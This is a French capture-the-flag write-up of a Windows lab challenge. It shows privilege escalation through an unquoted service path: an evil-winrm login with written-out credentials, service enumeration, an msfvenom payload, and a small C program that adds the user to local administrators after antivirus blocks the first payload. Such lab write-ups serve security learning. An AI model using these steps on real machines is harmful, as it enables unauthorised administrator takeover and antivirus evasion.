Pour le challenge 4 de la phase AD


j'ai pris l'indice au vu du nombre de point : 
"un service est vulnérable"

La consigne est d'accéder a la machine MH-CLI1 et accéder au bureau de l'administrateur pour y récupérer le flag.

En premier lieu j'ai scanné les ports de la vm pour faire une découverte sans succès il n'y a rien d'ouvert.

L'idée de passer par wmic viens ensuite : 

```evil-winrm -i 192.168.1.10 -u j.peuplu -p '6fhQ6B8Fg'```

bingo, accès au shell de la machine via l'utilisateur j.peuplu

les services réseaux ne sont pas accessibles, on est en environnement windows serveur.

on test : 
```powershell 
PS C:\Users\j.peuplu\Documents> Get-Service

Accès refusé```

```powershell 
PS C:\Users\j.peuplu\Documents> Get-CimInstance Win32_Service | Select Name,DisplayName,PathName,StartMode 

Accès refusé```

on galère un peu 


```powershell
PS C:\Users\j.peuplu\Documents> Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object { $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue if ($p.ImagePath) { [PSCustomObject]@{ Name = $_.PSChildName ImagePath = $p.ImagePath Start = $p.Start Object = $p.ObjectName } } } | Format-Table -AutoSize


Une liste barbante et excessivement longue .....
CTFService C:\Program Files\CTF Service\CTF Service\CTFService.exe 2
Une liste barbante et excessivement longue .....

```

TIENS TIENS TIENS...
Un service qui semble vulnérable 

```CTFService
C:\Program Files\CTF Service\CTF Service\CTFService.exe
StartMode : 2
Object : LocalSystem```
il est unquoted,  ça deviens très intéréssant.

on approfondie
```powershell
icacls "C:\Program Files\CTF Service"
icacls "C:\Program Files\CTF Service\CTF Service"
C:\Program Files\CTF Service  Tout le monde:(RX,W)

```
Là c'est intéressant, l'user j.peuplu peux écrire dans ce path.

Comment l'exploiter ?

2 solutions à ce moment là, un paypload qui permet soit d'ajouter l'utilisateur en tant qu'Administrateur local, soit aller fouiller et récupérer le flag sur le path du chemin de l'administrateur.

Je vais choisir la première méthode : 

```bash 
msfvenom -p windows/x64/exec CMD="net localgroup administrateurs j.peuplu /add" -f exe -o CTF.exe```

Le payload est créé sur ma kali je dois l'upload dans l'evilwinrm
```upload CTF.exe```

et je le déplace dans le path du service 

```powershell 
move CTF.exe "C:\Program Files\CTF Service\CTF.exe"```

en refaisant un dir dans le chemin distant on vois que le CTF.exe pèse 0, gros soucis. L'antivirus semble flag la signature de mon payload.

Mon niveau désastreux en dev ne me permettant pas d'y parvenir j'ai demandé à l'ia : 

```bash
nano test.c```
```c
#include <windows.h>
#include <stdlib.h>

int main() {
    system("cmd.exe /c net localgroup Administrateurs \"MH\\j.peuplu\" /add");
    return 0;
}
```

il me suffit ensuite de le compiler en .exe 
```bash
x86_64-w64-mingw32-gcc test.c -o CTF.exe```


On retente l'upload + déplacement du CTF.exe, bingo le fichier à un poids.

et là on redémarre le service CTF

```powershell
sc.exe stop CTFService
sc.exe start CTFService
```
et là on reboot le shell winrm, en serrant les fesses.

```powershell
net localgroup Administrateurs
```
bingo, J.peuplu apparait dans la liste ! 

on se déplace ensuite sur le bureau de l'administrateur 

```powershell
cd c:\Users\Administrateur\desktop
ls
> flag.txt

type flag.txt
fl@g{Ã¹nQÃ¹0tedp@th}
```

l'encodage semble bizarre, une fois remis en utf8 normal :

```fl@g{ùnQù0tedp@th}```


VAMOOOOOOOOS 

tu as réeussi le chall AD4 de mars@hack 2026